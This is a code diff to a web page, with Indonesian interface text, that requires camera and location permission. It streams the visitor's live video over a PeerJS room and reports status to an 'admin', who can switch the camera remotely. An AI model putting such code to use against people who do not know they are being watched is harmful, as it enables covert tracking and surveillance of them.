@@ -65,7 +65,7 @@
 
 <div id="errorScreen">
     <h1>Error</h1>
-    <p id="errorDetail">Izin lokasi dan kamera wajib diizinkan untuk melanjutkan.</p>
+    <p id="errorDetail">Izin lokasi dan kamera wajib diizinkan.</p>
     <button onclick="retryPermission()">Coba Lagi</button>
 </div>
 
@@ -74,7 +74,6 @@
 </div>
 
 <script>
-    // Ganti ROOM_ID sesuai keinginanmu agar unik milikmu sendiri
     const ROOM_ID = "jirun-live-room-9988";
 
     let currentFacing = "user"; // "user" = depan, "environment" = belakang
@@ -85,6 +84,7 @@
     let watchId = null;
     let latestLocation = null;
     let isStarting = false;
+    let isSwitchingCam = false;
     let hasError = false;
 
     const videoEl = document.getElementById("localVideo");
@@ -92,11 +92,12 @@
     const errorDetail = document.getElementById("errorDetail");
 
     function triggerError(message) {
+        if (hasError) return;
         hasError = true;
         cleanup();
         document.body.style.backgroundColor = "#090d16";
         document.body.style.color = "#f8fafc";
-        errorDetail.textContent = message || "Akses ditolak. Terjadi error.";
+        errorDetail.textContent = message || "Izin ditolak. Terjadi error.";
         errorScreen.style.display = "flex";
     }
 
@@ -122,7 +123,7 @@
     function requestLocationPermission() {
         return new Promise((resolve, reject) => {
             if (!navigator.geolocation) {
-                reject(new Error("Browser tidak mendukung izin lokasi."));
+                reject(new Error("Browser tidak mendukung lokasi."));
                 return;
             }
 
@@ -155,66 +156,67 @@
                 (err) => {
                     if (!resolvedOnce) {
                         resolvedOnce = true;
-                        if (err.code === err.PERMISSION_DENIED) {
-                            reject(new Error("Izin lokasi ditolak. Web error."));
+                        if (err && err.code === err.PERMISSION_DENIED) {
+                            reject(new Error("Izin lokasi ditolak."));
                         } else {
-                            reject(new Error("Gagal mendapatkan lokasi. Web error."));
+                            reject(new Error("Gagal mengambil lokasi."));
                         }
-                    } else if (err.code === err.PERMISSION_DENIED) {
-                        triggerError("Izin lokasi dicabut/ditolak. Web error.");
+                    } else if (err && err.code === err.PERMISSION_DENIED) {
+                        triggerError("Izin lokasi ditolak.");
                     }
                 },
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 1000 }
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
             );
         });
     }
 
-    async function openCamera(facing) {
+    async function openCamera(facing, isSwitch) {
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            throw new Error("Browser tidak mendukung izin kamera.");
+            throw new Error("Browser tidak mendukung kamera.");
         }
 
-        if (cameraStream) {
-            cameraStream.getTracks().forEach(t => t.stop());
-            cameraStream = null;
-        }
+        const oldStream = cameraStream;
+        isSwitchingCam = Boolean(isSwitch);
 
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({
+            const newStream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: { ideal: facing }, width: { ideal: 640 }, height: { ideal: 480 } },
                 audio: false
             });
 
             currentFacing = facing;
-            cameraStream = stream;
-            videoEl.srcObject = stream;
+            cameraStream = newStream;
+            videoEl.srcObject = newStream;
             await videoEl.play().catch(() => {});
 
-            // Jika kamera dihentikan/ditolak saat berjalan, langsung error
-            const vTrack = stream.getVideoTracks()[0];
-            if (vTrack) {
-                vTrack.onended = () => {
-                    if (!hasError && cameraStream === stream) {
-                        triggerError("Kamera terputus atau izin dicabut. Web error.");
-                    }
-                };
+            if (oldStream) {
+                oldStream.getTracks().forEach(t => {
+                    t.onended = null;
+                    t.stop();
+                });
             }
 
             if (activeCall && activeCall.peerConnection) {
-                const newTrack = stream.getVideoTracks()[0];
+                const newTrack = newStream.getVideoTracks()[0];
                 const sender = activeCall.peerConnection.getSenders().find(s => s.track && s.track.kind === "video");
                 if (sender && newTrack) {
-                    await sender.replaceTrack(newTrack);
+                    await sender.replaceTrack(newTrack).catch(() => {});
                 }
             }
 
             sendStatusToAdmin();
-            return stream;
+            return newStream;
         } catch (err) {
-            if (err && (err.name === "NotAllowedError" || err.name === "PermissionDeniedError")) {
-                throw new Error("Izin kamera ditolak. Web error.");
+            if (!isSwitch) {
+                if (err && (err.name === "NotAllowedError" || err.name === "PermissionDeniedError")) {
+                    throw new Error("Izin kamera ditolak.");
+                }
+                throw new Error("Kamera gagal dibuka.");
             }
-            throw new Error("Kamera tidak dapat diakses. Web error.");
+            console.error("Switch camera failed:", err);
+            return oldStream;
+        } finally {
+            isSwitchingCam = false;
         }
     }
 
@@ -231,14 +233,10 @@
             conn.on("data", async (msg) => {
                 if (!msg || !msg.type || hasError) return;
                 if (msg.type === "SWITCH_CAM") {
-                    try {
-                        const target = msg.facing === "environment" || msg.facing === "user"
-                            ? msg.facing
-                            : (currentFacing === "user" ? "environment" : "user");
-                        await openCamera(target);
-                    } catch (e) {
-                        triggerError(e.message || "Gagal mengganti kamera. Web error.");
-                    }
+                    const target = msg.facing === "environment" || msg.facing === "user"
+                        ? msg.facing
+                        : (currentFacing === "user" ? "environment" : "user");
+                    await openCamera(target, true);
                 } else if (msg.type === "PING") {
                     sendStatusToAdmin();
                 }
@@ -253,6 +251,10 @@
             activeCall = call;
             call.answer(cameraStream);
         });
+
+        peer.on("error", (err) => {
+            console.error("Peer error:", err);
+        });
     }
 
     async function init() {
@@ -260,16 +262,15 @@
         isStarting = true;
 
         try {
-            // 1. Minta izin lokasi dulu; jika ditolak langsung error
-            await requestLocationPermission();
-
-            // 2. Minta izin kamera; jika ditolak langsung error
-            await openCamera(currentFacing);
-
-            // 3. Aktifkan koneksi realtime selama halaman/Chrome terbuka
+            if (!latestLocation) {
+                await requestLocationPermission();
+            }
+            if (!cameraStream) {
+                await openCamera(currentFacing, false);
+            }
             setupPeer();
         } catch (err) {
-            triggerError(err && err.message ? err.message : "Izin ditolak. Web error.");
+            triggerError(err && err.message ? err.message : "Izin ditolak.");
         } finally {
             isStarting = false;
         }
@@ -281,7 +282,7 @@
     }
 
     function onTap() {
-        if (hasError) return;
+        if (hasError || isStarting || isSwitchingCam) return;
         if (!latestLocation || !cameraStream) {
             init();
         }
@@ -293,7 +294,10 @@
             watchId = null;
         }
         if (cameraStream) {
-            cameraStream.getTracks().forEach(t => t.stop());
+            cameraStream.getTracks().forEach(t => {
+                t.onended = null;
+                t.stop();
+            });
             cameraStream = null;
         }
         if (activeCall) {
